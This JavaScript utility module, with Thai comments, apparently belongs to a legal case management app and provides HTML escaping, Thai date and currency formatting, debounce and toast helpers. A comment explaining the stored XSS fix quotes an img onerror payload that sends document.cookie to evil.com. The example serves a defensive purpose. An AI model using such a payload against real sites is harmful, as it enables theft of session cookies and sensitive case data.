// =============================================================
// utils.js — ฟังก์ชันช่วยเหลือกลาง
// =============================================================

// -------------------------------------------------------------
// escapeHtml — จุดแก้ไขด้านความปลอดภัยที่สำคัญที่สุดของการรีแฟกเตอร์นี้
// -------------------------------------------------------------
// ของเดิมใช้ template literal ยัดค่าจากฐานข้อมูล (ชื่อคู่ความ, คำบรรยาย
// คดี ฯลฯ) ลงใน innerHTML ตรงๆ โดยไม่ผ่านการ escape เลย เช่น:
//   tbody.innerHTML += `<td>${c.description}</td>`
// ถ้ามีใครกรอกคำบรรยายคดีเป็น  <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
// โค้ดจะรันทันทีในเบราว์เซอร์ของทนายความ/พนักงานคนอื่นที่มาเปิดดูคดีนั้น
// (Stored XSS) — อันตรายมากเพราะระบบนี้เก็บข้อมูลอ่อนไหว (เลขบัตรประชาชน,
// ข้อมูลคดีความ) ทุกจุดที่แสดงข้อมูลจากฐานข้อมูลจึงต้อง escape ก่อนเสมอ
export function escapeHtml(value) {
  if (value === null || value === undefined) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// -------------------------------------------------------------
// formatDate / formatDateTime — พ.ศ. ไทย ใช้ร่วมกันทุกหน้า
// -------------------------------------------------------------
export function formatDateTimeTH(isoString) {
  if (!isoString) return { date: "—", time: "" };
  const d = new Date(isoString);
  const date = d.toLocaleDateString("th-TH", { day: "2-digit", month: "short", year: "2-digit" });
  const time = d.toLocaleTimeString("th-TH", { hour: "2-digit", minute: "2-digit" }) + " น.";
  return { date, time };
}

// แปลง ISO string จากฐานข้อมูล ให้เป็นรูปแบบที่ <input type="datetime-local">
// เข้าใจ (YYYY-MM-DDTHH:MM) โดยอิงเวลาท้องถิ่นของเครื่อง ไม่ใช่ UTC ตรงๆ
export function isoToDateTimeLocalValue(isoString) {
  if (!isoString) return "";
  const d = new Date(isoString);
  const tzOffsetMs = d.getTimezoneOffset() * 60000;
  return new Date(d.getTime() - tzOffsetMs).toISOString().slice(0, 16);
}

export function formatCurrency(amount) {
  const n = Number(amount) || 0;
  return n.toLocaleString("th-TH", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// -------------------------------------------------------------
// debounce — ป้องกันช่องค้นหาด่วนยิง query ทุกครั้งที่กดแป้นพิมพ์
// -------------------------------------------------------------
export function debounce(fn, delayMs = 300) {
  let timer = null;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delayMs);
  };
}

// -------------------------------------------------------------
// showToast — แจ้งเตือนแบบไม่บล็อกหน้าจอ (แทน alert() ของเดิมทั้งหมด)
// -------------------------------------------------------------
// alert() บล็อกทั้งหน้าเว็บและดูไม่เป็นมืออาชีพเมื่อใช้งานจริงในองค์กร
// เปลี่ยนเป็น toast มุมขวาบน หายไปเองใน 3 วินาที
export function showToast(message, type = "success") {
  const containerId = "toastContainer";
  let container = document.getElementById(containerId);
  if (!container) {
    container = document.createElement("div");
    container.id = containerId;
    container.className = "fixed top-4 right-4 z-[100] space-y-2 w-full max-w-sm";
    document.body.appendChild(container);
  }
  const colors = {
    success: "bg-emerald-600",
    error: "bg-red-600",
    info: "bg-slate-800",
  };
  const toast = document.createElement("div");
  toast.className = `${colors[type] || colors.info} text-white text-sm font-medium px-4 py-3 rounded-lg shadow-lg animate-fadeIn`;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => {
    toast.style.transition = "opacity 0.3s";
    toast.style.opacity = "0";
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

export function getFormValue(id) {
  const el = document.getElementById(id);
  return el ? el.value.trim() : "";
}
